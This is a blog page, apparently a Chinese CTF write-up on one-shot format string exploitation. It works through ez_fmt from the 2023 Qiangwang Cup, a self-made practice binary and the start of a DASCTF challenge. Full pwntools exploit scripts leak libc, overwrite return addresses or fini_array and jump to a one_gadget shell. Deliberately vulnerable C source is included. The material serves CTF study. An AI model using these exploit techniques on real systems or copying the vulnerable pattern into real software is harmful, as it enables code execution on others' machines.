<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>一次性格式化字符串利用 | tw11ty Blog</title><meta name="author" content="tw11ty"><meta name="copyright" content="tw11ty"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="一次性格式化字符串【2023 强网杯】ez_fmt没开pie，开了 full Relro，改不了got和fini_array，也给了buf地址，栈上地址用偏移算 改printf_ret地址，绕过w&#x3D;&#x3D;0xffff的限制，控制程序再次执行read 0x00401205  再次执行格式化字符串 12345678910111213141516171819202122232425262">
<meta property="og:type" content="article">
<meta property="og:title" content="一次性格式化字符串利用">
<meta property="og:url" content="http://tw11ty.github.io/2024/06/08/%E4%B8%80%E6%AC%A1%E6%80%A7%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%A9%E7%94%A8/index.html">
<meta property="og:site_name" content="tw11ty Blog">
<meta property="og:description" content="一次性格式化字符串【2023 强网杯】ez_fmt没开pie，开了 full Relro，改不了got和fini_array，也给了buf地址，栈上地址用偏移算 改printf_ret地址，绕过w&#x3D;&#x3D;0xffff的限制，控制程序再次执行read 0x00401205  再次执行格式化字符串 12345678910111213141516171819202122232425262">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://tw11ty.github.io/img/MyImg.png">
<meta property="article:published_time" content="2024-06-08T08:43:06.000Z">
<meta property="article:modified_time" content="2024-11-16T08:37:23.550Z">
<meta property="article:author" content="tw11ty">
<meta property="article:tag" content="fmt">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://tw11ty.github.io/img/MyImg.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "一次性格式化字符串利用",
  "url": "http://tw11ty.github.io/2024/06/08/%E4%B8%80%E6%AC%A1%E6%80%A7%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%A9%E7%94%A8/",
  "image": "http://tw11ty.github.io/img/MyImg.png",
  "datePublished": "2024-06-08T08:43:06.000Z",
  "dateModified": "2024-11-16T08:37:23.550Z",
  "author": [
    {
      "@type": "Person",
      "name": "tw11ty",
      "url": "http://tw11ty.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/info.ico"><link rel="canonical" href="http://tw11ty.github.io/2024/06/08/%E4%B8%80%E6%AC%A1%E6%80%A7%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%A9%E7%94%A8/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: {"limitCount":150,"languages":{"author":"Author: tw11ty","link":"Link: ","source":"Source: tw11ty Blog","info":"Copyright belongs to the author. For commercial use, please contact the author for authorization. For non-commercial use, please indicate the source."}},
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '一次性格式化字符串利用',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  isShuoshuo: false
}</script><link rel="alternate" href="/atom.xml" title="tw11ty Blog" type="application/atom+xml">
<link rel="stylesheet" href="/css/prism.css" type="text/css"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/MyImg.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">9</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">3</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user-circle"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder"></i><span> Categories</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img fixed" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/img.png" alt="Logo"><span class="site-name">tw11ty Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">一次性格式化字符串利用</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user-circle"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder"></i><span> Categories</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">一次性格式化字符串利用</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-06-08T08:43:06.000Z" title="Created 2024-06-08 16:43:06">2024-06-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-11-16T08:37:23.550Z" title="Updated 2024-11-16 16:37:23">2024-11-16</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/STU/">STU</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><article class="container post-content" id="article-container"><h1 id="一次性格式化字符串"><a href="#一次性格式化字符串" class="headerlink" title="一次性格式化字符串"></a>一次性格式化字符串</h1><h2 id="【2023-强网杯】ez-fmt"><a href="#【2023-强网杯】ez-fmt" class="headerlink" title="【2023 强网杯】ez_fmt"></a>【2023 强网杯】ez_fmt</h2><p>没开pie，开了 full Relro，改不了got和fini_array，也给了buf地址，栈上地址用偏移算</p>
<p>改printf_ret地址，绕过w&#x3D;&#x3D;0xffff的限制，控制程序再次执行read 0x00401205  再次执行格式化字符串</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.packing <span class="keyword">import</span> p64, u64, p32, u32</span><br><span class="line"><span class="comment">#from ctypes import *</span></span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"></span><br><span class="line">s    = <span class="keyword">lambda</span> data               : io.send(data)</span><br><span class="line">sa   = <span class="keyword">lambda</span> delim, data        : io.sendafter(delim,data)</span><br><span class="line">sl   = <span class="keyword">lambda</span> data               : io.sendline(data)</span><br><span class="line">sla  = <span class="keyword">lambda</span> delim, data        : io.sendlineafter(delim, data)</span><br><span class="line">r    = <span class="keyword">lambda</span> num=<span class="number">4096</span>           : io.recv(num)</span><br><span class="line">ru   = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  : io.recvuntil(delims, drop)</span><br><span class="line">itr  = <span class="keyword">lambda</span>                    : io.interactive()</span><br><span class="line">r64  = <span class="keyword">lambda</span>                    : io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r32  = <span class="keyword">lambda</span>                    : io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">4</span>:]</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data               : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data               : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak = <span class="keyword">lambda</span> name, value        : info(<span class="string">&quot;&#123;&#125;:0x&#123;:x&#125;&quot;</span>.<span class="built_in">format</span>(name,value))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmt</span>(<span class="params">data1,data2</span>):   <span class="comment">#payload = b&#x27;%&#x27; + str(data) + b&#x27;c&#x27; + padding + &#x27;%&#x27; + str(offset) + b&#x27;$hhn&#x27; + p64(adr)</span></span><br><span class="line">    padding1  = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    padding2  = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    data2     = data2-data1  </span><br><span class="line">    payload1  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(data1) + <span class="string">b&#x27;c&#x27;</span> + padding1 + <span class="string">&#x27;%10$hn&#x27;</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">len</span>(payload1)&lt;<span class="number">0x10</span>):</span><br><span class="line">        padding1 += <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x10</span>-<span class="built_in">len</span>(payload1))</span><br><span class="line">        data1    -= <span class="built_in">len</span>(padding1)</span><br><span class="line">        payload1  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(data1) + <span class="string">b&#x27;c&#x27;</span> + padding1 + <span class="string">&#x27;%10$hn&#x27;</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(payload1)&lt;<span class="number">0x10</span>):</span><br><span class="line">            padding1 += <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x10</span>-<span class="built_in">len</span>(payload1))</span><br><span class="line">            payload1   = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(data1) + <span class="string">b&#x27;c&#x27;</span> + padding1 + <span class="string">&#x27;%10$hn&#x27;</span></span><br><span class="line"></span><br><span class="line">    payload2 = payload1 + <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(data2) + <span class="string">b&#x27;c&#x27;</span> + padding2 + <span class="string">b&#x27;%11$hn&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(payload2)</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">len</span>(payload2)&lt;<span class="number">0x20</span>):</span><br><span class="line">        padding2 += <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x20</span>-<span class="built_in">len</span>(payload2))</span><br><span class="line">        data2    -= <span class="built_in">len</span>(padding2)</span><br><span class="line">        payload2   = payload1 + <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(data2) + <span class="string">b&#x27;c&#x27;</span> + padding2 + <span class="string">b&#x27;%11$hn&#x27;</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(payload2)&lt;<span class="number">0x20</span>):</span><br><span class="line">            padding2 += <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x20</span>-<span class="built_in">len</span>(payload2))</span><br><span class="line">            payload2   = payload1 + <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(data2) + <span class="string">b&#x27;c&#x27;</span> + padding2 + <span class="string">b&#x27;%11$hn&#x27;</span></span><br><span class="line">    payload2 += p64(ret_addr) + p64(ret_addr+<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> payload2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    py1 = <span class="string">b&#x27;%4198917c%9$hn%19$paaaaa&#x27;</span> + p64(printf_ret)</span><br><span class="line">    <span class="comment"># debug()</span></span><br><span class="line">    s(py1)</span><br><span class="line">    ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">    libc_base = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>) - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]-<span class="number">243</span></span><br><span class="line">    leak(<span class="string">&quot;libc_base&quot;</span> , libc_base)</span><br><span class="line">    one_gadget = libc_base + <span class="number">0xe3b01</span></span><br><span class="line">    <span class="comment"># debug()</span></span><br><span class="line">    py2 = fmt(one_gadget&amp;<span class="number">0xffff</span>,(one_gadget&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>)</span><br><span class="line">    s(py2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    pwn_log_level = <span class="string">&#x27;info&#x27;</span>   </span><br><span class="line">    pwn_arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">    pwn_os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">    context(log_level=pwn_log_level, arch=pwn_arch, os=pwn_os)</span><br><span class="line">    context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">    pwnfile = <span class="string">&#x27;./ez_fmt&#x27;</span></span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">    io = remote(<span class="string">&#x27;47.104.24.40&#x27;</span>,<span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line">    elf = ELF(pwnfile)</span><br><span class="line">    rop = ROP(pwnfile)</span><br><span class="line">    context.binary = pwnfile</span><br><span class="line">    libc_name  = <span class="string">&#x27;./libc-2.31.so&#x27;</span></span><br><span class="line">    libc = ELF(libc_name) </span><br><span class="line"></span><br><span class="line">    fini_arry = <span class="number">0x0403DC0</span></span><br><span class="line">    main      = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">    stack = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">    ret_addr   = stack + <span class="number">0x68</span></span><br><span class="line">    printf_ret = stack - <span class="number">0x8</span></span><br><span class="line">    leak(<span class="string">&quot;print_ret&quot;</span>,printf_ret)</span><br><span class="line">    leak(<span class="string">&quot;ret_addr&quot;</span>,ret_addr)</span><br><span class="line">    pwn()</span><br><span class="line"></span><br><span class="line">    itr()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h2><p>自己出的练手题  没开RELRO，直接打fini_array绕过一次性格式化字符串</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">init_func</span><span class="params">()</span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    init_func();</span><br><span class="line">    <span class="type">char</span> str[<span class="number">0x100</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;please input your payload:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, str, <span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//gcc fmt.c -no-pie -z norelro  -o fmt </span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.packing <span class="keyword">import</span> p64, u64, p32, u32</span><br><span class="line"><span class="comment">#from ctypes import *</span></span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#from struct import pack</span></span><br><span class="line"></span><br><span class="line">s    = <span class="keyword">lambda</span> data               : io.send(data)</span><br><span class="line">sl   = <span class="keyword">lambda</span> data               : io.sendline(data)</span><br><span class="line">sa   = <span class="keyword">lambda</span> delim, data        : io.sendafter(delim,data)</span><br><span class="line">sla  = <span class="keyword">lambda</span> delim, data        : io.sendlineafter(delim, data)</span><br><span class="line">r    = <span class="keyword">lambda</span> num=<span class="number">4096</span>           : io.recv(num)</span><br><span class="line">ru   = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  : io.recvuntil(delims, drop)</span><br><span class="line">itr  = <span class="keyword">lambda</span>                    : io.interactive()</span><br><span class="line">r64  = <span class="keyword">lambda</span>                    : io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r32  = <span class="keyword">lambda</span>                    : io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">4</span>:]</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data               : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data               : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak = <span class="keyword">lambda</span> name, value        : info(<span class="string">&quot;&#123;&#125;:0x&#123;:x&#125;&quot;</span>.<span class="built_in">format</span>(name,value))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    pwn_log_level = <span class="string">&#x27;info&#x27;</span>   <span class="comment">#&#x27;info&#x27;</span></span><br><span class="line">    pwn_arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">    pwn_os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">    context(log_level=pwn_log_level, arch=pwn_arch, os=pwn_os)</span><br><span class="line">    context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">    pwnfile = <span class="string">&#x27;./fmt&#x27;</span></span><br><span class="line">    <span class="comment">#io = process(pwnfile)</span></span><br><span class="line">    io = remote(<span class="string">&#x27;&#x27;</span>,  )</span><br><span class="line">    elf = ELF(pwnfile)</span><br><span class="line">    rop = ROP(pwnfile)</span><br><span class="line">    libc_name = <span class="string">&#x27;./libc.so.6&#x27;</span>   </span><br><span class="line">    libc = ELF(libc_name) </span><br><span class="line"></span><br><span class="line">    fini_arry = <span class="number">0x0403198</span> </span><br><span class="line">    main = <span class="number">0x4011ff</span></span><br><span class="line">    printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&#x27;%41$p--%43$paaaa&#x27;</span>  + fmtstr_payload(<span class="number">8</span>, &#123;fini_arry : main&#125;, numbwritten=<span class="number">34</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;payload:&#x27;</span>)</span><br><span class="line">    <span class="comment"># debug() </span></span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">    libc_base = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">243</span> - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">    ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">    stack = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x2f0</span>      <span class="comment">#0xf0 -0xe0 - 0x120</span></span><br><span class="line">    leak(<span class="string">&quot;libc_base&quot;</span>, libc_base)</span><br><span class="line">    leak(<span class="string">&quot;stack&quot;</span>, stack)</span><br><span class="line"></span><br><span class="line">    one = <span class="number">0xe3b01</span> + libc_base     <span class="comment">#0xe3b01 0xe3b04 0xe3cf6 0x1075aa 0x1075b2 0x1075b7 0x1075c1</span></span><br><span class="line">    payload = fmtstr_payload(<span class="number">6</span>, &#123;stack:one&#125;)</span><br><span class="line">    ru(<span class="string">b&#x27;payload:&#x27;</span>)</span><br><span class="line">    <span class="comment"># debug()</span></span><br><span class="line">    s(payload)</span><br><span class="line"></span><br><span class="line">    itr()</span><br><span class="line"></span><br></pre></td></tr></table></figure>




<h2 id="【DASCTF-X-HDCTF-2024-公开赛】签个到吧"><a href="#【DASCTF-X-HDCTF-2024-公开赛】签个到吧" class="headerlink" title="【DASCTF X HDCTF 2024 公开赛】签个到吧"></a>【DASCTF X HDCTF 2024 公开赛】签个到吧</h2><p>非栈上一次性格式化字符串 </p>
<p>远程环境：2.31-0ubuntu9.15</p>
<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406071529364.png" alt="image-20240607152900330"></p>
<p>给了栈地址 以及0x100长度限制的格式化字符串</p>
<blockquote>
<p>思路：改_exit_got为main地址同时泄露libc，然后再改exit_got为one_gadget，退出时执行one_gadget</p>
</blockquote>
<p>如何修改got？</p>
<p>printf时的栈空间  利用rsp+8 处的连续指针 （fmtarg 看相对偏移括号里面的不用管）</p>
<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406071611393.png" alt="image-20240607161107350"></p>
